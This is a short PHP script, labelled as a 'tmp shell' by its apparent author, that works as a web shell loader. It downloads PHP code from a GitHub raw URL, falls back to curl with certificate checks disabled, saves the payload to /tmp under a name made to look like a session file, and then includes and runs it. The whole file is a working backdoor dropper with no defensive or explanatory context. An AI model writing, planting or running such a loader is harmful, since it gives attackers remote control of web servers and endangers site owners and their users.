<?php #tmp shell by RH077KING
$URL = 'https://raw.githubusercontent.com/Rh077king/Shell/main/cks.php'; #admin
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';

function M() {
	$FGT = @file_get_contents($GLOBALS['URL']);
	if(!$FGT) {
		echo `curl -k $(echo {$GLOBALS['URL']}) > {$GLOBALS['TMP']}`;
	} else {
		$HANDLE = fopen($GLOBALS['TMP'], 'w');
		fwrite($HANDLE, $FGT);
		fclose($HANDLE);
	}
	echo '<script>window.location="?work";</script>';
}

if(file_exists($TMP)) {
	if(filesize($TMP) === 0) {
		unlink($TMP);
		M();
	} else {
		include($TMP);
	}
} else {
	M();
}
?>
